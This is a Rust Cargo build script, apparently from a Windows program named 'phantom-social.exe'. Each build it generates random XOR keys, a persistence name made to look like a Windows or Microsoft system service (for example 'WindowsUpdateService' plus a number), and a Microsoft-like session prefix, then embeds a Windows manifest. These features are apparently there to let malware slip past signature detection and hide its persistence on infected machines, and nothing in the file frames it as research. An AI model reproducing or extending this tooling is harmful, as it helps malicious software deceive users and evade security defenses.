use std::env;
use std::fs::File;
use std::io::Write;
use std::path::Path;

fn main() {
    let out_dir = env::var("OUT_DIR").unwrap();
    let dest_path = Path::new(&out_dir).join("generated.rs");
    let mut f = File::create(&dest_path).unwrap();

    let xor_keys: Vec<String> = (0..16)
        .map(|_| format!("0x{:02X}", rand::random::<u8>()))
        .collect();

    let prefixes = ["Windows", "Microsoft", "System", "Security", "Update"];
    let suffixes = ["Service", "Monitor", "Health", "Manager", "Helper", "Assistant"];
    let persist_name = format!(
        "{}{}{}",
        prefixes[rand::random::<usize>() % prefixes.len()],
        suffixes[rand::random::<usize>() % suffixes.len()],
        rand::random::<u16>() % 1000
    );

    let session_prefix = format!("MS{:X}", rand::random::<u32>());

    // FIXED: Adjusted indentation to prevent "lines skipped" warnings
    write!(
        f,
        "// Auto-generated - DO NOT EDIT\n\
const XOR_KEYS: [u8; 16] = [{}];\n\
const PERSIST_NAME: &str = \"{}\";\n\
const SESSION_PREFIX: &str = \"{}\";\n",
        xor_keys.join(", "),
        persist_name,
        session_prefix
    )
    .unwrap();

    println!("cargo:rerun-if-changed=build.rs");

    // Embed the Windows manifest (only on Windows targets)
    if cfg!(target_os = "windows") {
        embed_manifest::embed_manifest_file("phantom-social.exe.manifest")
            .expect("Failed to embed manifest");
    }

    // Trigger rebuild if manifest changes
    println!("cargo:rerun-if-changed=phantom-social.exe.manifest");
}

